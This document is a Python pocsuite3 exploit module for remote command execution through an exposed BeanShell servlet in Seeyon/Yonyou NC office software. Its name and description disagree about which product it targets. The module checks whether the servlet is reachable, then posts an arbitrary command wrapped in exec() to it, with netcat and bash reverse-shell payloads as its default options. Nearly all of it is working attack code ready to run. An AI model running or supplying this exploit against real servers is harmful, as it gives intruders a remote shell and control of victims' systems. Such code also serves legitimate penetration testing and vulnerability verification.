from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = '003'  # ssvid
    version = '1.0'
    name = 'Seeyon bsh.servlet.BshServlet RCE'
    appName = 'Seeyon'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/servlet/~ic/bsh.servlet.BshServlet"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "BeanShell Test Servlet" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self): #交互式command
        result = {}
        cmd = self.get_option("command")
        print(cmd)
        try:
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            target = self.url+"/servlet/~ic/bsh.servlet.BshServlet"
            data = "bsh.script=exec%28%22"+cmd+"%22%29%3B%0D%0A%0D%0A%0D%0A%0D%0A"
            r = requests.post(url=target,timeout=5,verify=False,data=data,headers=headers)
            match = re.findall(r'^[^ \n]*$',r.text,re.S|re.I|re.M)
            print(match[5])
            result['verifyInfo']={}
            result['verifyInfo']['Payload'] = data
            return self.parse_output(result)
        except:
        	return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)